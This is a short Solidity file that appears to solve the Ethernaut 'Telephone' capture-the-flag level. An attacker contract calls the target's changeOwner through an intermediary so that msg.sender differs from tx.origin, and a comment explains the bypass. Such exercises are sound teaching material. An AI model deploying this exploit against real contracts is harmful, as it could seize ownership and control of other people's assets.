pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    Telephone telephone;
    
    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function changeOwner(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}

// Solution = Msg.sender must not be equal to tx.origin so in this case, msg.sender is this contract
// and tx.origin is the address calling the changeOnwer function. 